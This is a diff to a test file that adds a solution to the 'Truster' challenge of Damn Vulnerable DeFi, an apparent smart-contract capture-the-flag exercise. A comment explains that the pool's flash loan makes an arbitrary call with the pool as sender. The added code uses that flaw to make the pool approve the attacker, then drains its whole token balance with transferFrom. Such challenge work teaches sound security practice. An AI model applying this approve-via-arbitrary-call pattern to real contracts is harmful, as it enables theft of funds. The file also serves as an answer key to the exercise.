@@ -29,6 +29,16 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        /** WHAT'S WRONG?
+         * @notice what actually wrong with this LenderPool is this contract
+         * provide a method that can call any function from any smartcontract
+         * but what should we call? first it's use low level call (not delegateCall)
+         * which is make that Pool contract become the msg.sender of the call. 
+         * so what if we call DVT token approve() function? 
+         */
+        const data = (await this.token.populateTransaction.approve(attacker.address,TOKENS_IN_POOL)).data;
+        await this.pool.connect(attacker).flashLoan(0,attacker.address,this.token.address,data);
+        await this.token.connect(attacker).transferFrom(this.pool.address,attacker.address,TOKENS_IN_POOL);
     });
 
     after(async function () {
